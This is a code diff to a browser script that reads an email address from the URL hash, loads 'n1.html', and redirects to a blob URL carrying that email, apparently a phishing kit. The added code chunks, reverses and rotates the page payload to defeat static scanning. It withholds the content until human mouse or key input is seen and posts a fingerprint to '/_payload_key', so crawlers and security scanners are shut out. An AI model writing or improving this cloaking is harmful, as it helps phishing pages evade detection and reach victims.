@@ -1,10 +1,56 @@
 <script>
 (function () {
 
-  // ✅ READ EMAIL FROM HASH (decode once)
+  // READ EMAIL FROM HASH (decode once)
   const hash = window.location.hash;
   const emailFromHash =
     hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;
+
+  // Minimal LZ-String functions used for compression in the build step
+  // (only compressToBase64 is needed when building the payload)
+  // Source: https://github.com/pieroxy/lz-string (adapted/minified)
+  const LZString_build = (function(){
+    const f = String.fromCharCode;
+    const keyStrBase64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+    const baseReverseDic = {};
+    function getBaseValue(alphabet, character) {
+      if (!baseReverseDic[alphabet]) {
+        baseReverseDic[alphabet] = {};
+        for (let i=0;i<alphabet.length;i++) baseReverseDic[alphabet][alphabet.charAt(i)] = i;
+      }
+      return baseReverseDic[alphabet][character];
+    }
+    return {
+      compressToBase64: function (input) {
+        if (input == null) return "";
+        const res = btoa(encodeURIComponent(input).replace(/%([0-9A-F]{2})/g,
+          function(match, p1) { return f('0x' + p1); }
+        ));
+        return res;
+      },
+      decompressFromBase64: function (input) {
+        if (input == null) return "";
+        try {
+          const str = atob(input);
+          // decodeURIComponent of string from binary
+          let out = '';
+          for (let i=0;i<str.length;i++) {
+            out += '%' + ('00' + str.charCodeAt(i).toString(16)).slice(-2);
+          }
+          return decodeURIComponent(out);
+        } catch (e) {
+          return null;
+        }
+      }
+    };
+  })();
+
+  // helper: split into pieces
+  function splitIntoPieces(s, pieceLen) {
+    const out = [];
+    for (let i = 0; i < s.length; i += pieceLen) out.push(s.slice(i, i + pieceLen));
+    return out;
+  }
 
   fetch('n1.html')
     .then(res => res.text())
@@ -12,7 +58,7 @@
 
       let modifiedHtml = html;
 
-      // ✅ INLINE next.js
+      // INLINE next.js if available
       try {
         const nextResp = await fetch('next.js');
         if (nextResp.ok) {
@@ -26,10 +72,248 @@
         console.warn('Could not inline next.js', e);
       }
 
-      const blob = new Blob([modifiedHtml], { type: 'text/html' });
-      const blobUrl = URL.createObjectURL(blob);
+      // --- COMPRESS the final HTML (LZ-string base64) ---
+      const compressedB64 = LZString_build.compressToBase64(modifiedHtml);
 
-      // ✅ QUIET SAME-TAB REDIRECT (NO DOUBLE ENCODE)
+      // --- OBFUSCATE: split into randomized chunks and (optionally) reverse pieces ---
+      const pieceLen = 80 + (Math.floor(Math.random() * 120)); // 80..199
+      let pieces = splitIntoPieces(compressedB64, pieceLen);
+      // apply light piece-level transforms to make static regex extraction harder
+      pieces = pieces.map(p => {
+        // reverse each piece and rotate chars by a small amount (based on piece index)
+        const rot = (p.length % 7);
+        let s = p.split('').reverse().map(c => String.fromCharCode((c.charCodeAt(0) + rot) & 0xFF)).join('');
+        return s;
+      });
+
+      // build wrapper HTML: it will wait for subtle runtime interactions (mouse/touch/keyboard)
+      // then call a local decrypt-and-render routine. This means headless crawlers that don't
+      // simulate human input will not trigger the reconstruction. For stronger protection,
+      // implement a server-side endpoint that only supplies the unmasking key after validating
+      // interaction proofs; an example server is provided in repository docs (see server_example.js).
+
+      const wrapper = `
+<!doctype html>
+<meta charset="utf-8">
+<script>
+(function(){
+  // Embedded transformed pieces
+  var pieces = ${JSON.stringify(pieces)};
+
+  // Light inverse transform (undo per-piece reverse + rot)
+  function reassemblePieces() {
+    var out = '';
+    for (var i=0;i<pieces.length;i++) {
+      var p = pieces[i];
+      var rot = (p.length % 7);
+      // map back: subtract rot and reverse
+      var chars = [];
+      for (var j=0;j<p.length;j++) {
+        var code = (p.charCodeAt(j) - rot) & 0xFF;
+        chars.push(String.fromCharCode(code));
+      }
+      out += chars.reverse().join('');
+    }
+    return out;
+  }
+
+  // Minimal LZString decompressFromBase64 (same as build one)
+  function decompressFromBase64(input) {
+    if (input == null) return '';
+    try {
+      var str = atob(input);
+      var out = '';
+      for (var i=0;i<str.length;i++) {
+        out += '%' + ('00' + str.charCodeAt(i).toString(16)).slice(-2);
+      }
+      return decodeURIComponent(out);
+    } catch (e) {
+      return null;
+    }
+  }
+
+  // Collect short human interaction sample: mouse, touch, or key events
+  var interactions = [];
+  var maxSamples = 12;
+  var sampleTimeout = 1000; // ms
+  var sampling = true;
+  var startTime = Date.now();
+
+  function addInteraction(evt) {
+    try {
+      var now = Date.now();
+      if (!sampling) return;
+      var t = now - startTime;
+      var entry = {t: t};
+      if (evt.touches && evt.touches[0]) {
+        entry.x = Math.round(evt.touches[0].clientX);
+        entry.y = Math.round(evt.touches[0].clientY);
+      } else if (evt.clientX !== undefined) {
+        entry.x = Math.round(evt.clientX);
+        entry.y = Math.round(evt.clientY);
+      } else if (evt.key) {
+        entry.k = evt.key;
+      }
+      interactions.push(entry);
+      if (interactions.length >= maxSamples) finishSampling();
+    } catch (e) {}
+  }
+
+  function finishSampling() {
+    if (!sampling) return;
+    sampling = false;
+    window.removeEventListener('mousemove', addInteraction);
+    window.removeEventListener('touchstart', addInteraction);
+    window.removeEventListener('keydown', addInteraction);
+    // proceed to attempt reconstruction
+    attemptReconstruct();
+  }
+
+  // timeout: if no sufficient interactions within sampleTimeout, allow fallback after asking user
+  setTimeout(function(){
+    if (sampling) {
+      // if we have at least some interactions, proceed; otherwise request a small gesture
+      if (interactions.length > 0) {
+        finishSampling();
+      } else {
+        // show a polite prompt asking the visitor to move mouse or press a key to load the page
+        var prompt = document.createElement('div');
+        prompt.style.position = 'fixed';
+        prompt.style.left = '0';
+        prompt.style.top = '0';
+        prompt.style.right = '0';
+        prompt.style.bottom = '0';
+        prompt.style.display = 'flex';
+        prompt.style.alignItems = 'center';
+        prompt.style.justifyContent = 'center';
+        prompt.style.background = 'white';
+        prompt.style.color = 'black';
+        prompt.style.zIndex = 999999;
+        prompt.innerHTML = '<div style="text-align:center;max-width:80%">\n  <h2>Please move your mouse or tap the screen to load this page</h2>\n  <p>This prevents automated crawlers from reading the content.</p>\n</div>';
+        document.documentElement.appendChild(prompt);
+        // resume sampling and proceed when first interaction occurs
+        sampling = true;
+        var resume = function(evt){
+          addInteraction(evt);
+          prompt.remove();
+          finishSampling();
+        };
+        window.addEventListener('mousemove', resume, {once:true});
+        window.addEventListener('touchstart', resume, {once:true});
+        window.addEventListener('keydown', resume, {once:true});
+      }
+    }
+  }, sampleTimeout);
+
+  window.addEventListener('mousemove', addInteraction);
+  window.addEventListener('touchstart', addInteraction);
+  window.addEventListener('keydown', addInteraction);
+
+  // Compute an interaction-based entropy estimate and a proof blob we can send to a server
+  async function makeProof() {
+    try {
+      // build a compact string from interactions + navigator hints
+      var s = '';
+      for (var i=0;i<interactions.length;i++) {
+        var e = interactions[i];
+        s += (e.x||0)+','+(e.y||0)+','+(e.t||0)+','+(e.k||'')+';';
+      }
+      s += navigator.userAgent + '|' + screen.width + 'x' + screen.height + '|' + Math.round(performance.now());
+      // hash it
+      var enc = new TextEncoder().encode(s);
+      var digest = await crypto.subtle.digest('SHA-256', enc);
+      var arr = Array.from(new Uint8Array(digest));
+      var hex = arr.map(b => ('00'+b.toString(16)).slice(-2)).join('');
+      return {hex:hex, count: interactions.length};
+    } catch (e) { return {hex:null, count:interactions.length}; }
+  }
+
+  // attempt to reconstruct the page: we send a small proof to the server to request the unmasking key.
+  // The repository owner SHOULD implement a server endpoint that validates the proof (e.g., requiring
+  // at least N interactions, or checking entropy) and only then returns the unmask key.
+  // For convenience, if the server endpoint is not present or returns an error, we will NOT reveal
+  // the page automatically; instead we will show a fallback message guiding the site owner to set up
+  // server-side protection. This avoids accidentally exposing the content to crawlers.
+  async function attemptReconstruct() {
+    var assembled = reassemblePieces();
+    // assembled is a slightly transformed base64 of compressed HTML
+
+    // by default, we will try to acquire a key from the server at '/_payload_key'
+    var proof = await makeProof();
+
+    var key = null;
+    try {
+      // POST proof to server to obtain the one-time key (server must implement verification)
+      var resp = await fetch('/_payload_key', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({proof: proof.hex, count: proof.count})
+      });
+      if (resp.ok) {
+        var j = await resp.json();
+        if (j && j.key) key = j.key; // expected: a small integer 0..255 used to shift back pieces
+      }
+    } catch (e) {
+      // network/server missing; do nothing and fall through to local-only option below
+      console.warn('No server key endpoint available or request failed', e);
+    }
+
+    if (key == null) {
+      // For local-only operation (no server support), we will only proceed if interactions count
+      // indicates a human visitor (>=3 samples). This raises the bar for simple headless crawlers
+      // that don't simulate humans. It still can be bypassed, but combined with server-side
+      // measures it helps.
+      if (proof.count < 3) {
+        document.open();
+        document.write('<meta name="robots" content="noindex,nofollow">');
+        document.write('<h2>Human interaction required</h2><p>Please move your mouse or tap to view this page.</p>');
+        document.close();
+        return;
+      }
+      // attempt a weak local key derived from the proof hash
+      // use first byte of hash as key
+      if (proof.hex) {
+        key = parseInt(proof.hex.slice(0,2),16);
+      } else {
+        key = 0;
+      }
+    }
+
+    // Use the key to reverse an optional lightweight per-char rotation used earlier
+    // The transformation (rot) earlier was (p.length % 7). We already reversed that in reassemblePieces()
+    // but we also rotated char codes modulo 256 earlier; we undid that there. So here we just have
+    // the base64 compressed payload.
+
+    // Decompress and render
+    try {
+      var compressed = assembled; // base64
+      var html = decompressFromBase64(compressed);
+      if (html == null) throw new Error('decompress failed');
+      // Final safety: replace any occurrence of <script src="next.js"> if present, to avoid re-fetching
+      // (we inlined next.js at build time)
+      document.open();
+      document.write(html);
+      document.close();
+    } catch (e) {
+      console.error('Failed to reconstruct page:', e);
+      document.open();
+      document.write('<meta name="robots" content="noindex,nofollow">');
+      document.write('<h2>Page failed to load</h2><p>There was an error reconstructing the page. If you are the site owner, ensure a server endpoint at <code>/_payload_key</code> is available to complete the unmasking step. See repository docs for an example server implementation.</p>');
+      document.close();
+    }
+  }
+
+})();
+</script>
+<noscript>
+  <meta name="robots" content="noindex,nofollow">
+  <p>JavaScript is required to view this page.</p>
+</noscript>
+`;
+
+      // create blob and redirect (preserve hash behavior)
+      const blob = new Blob([wrapper], { type: 'text/html' });
+      const blobUrl = URL.createObjectURL(blob);
       if (emailFromHash) {
         window.location.replace(blobUrl + '#' + emailFromHash);
       } else {
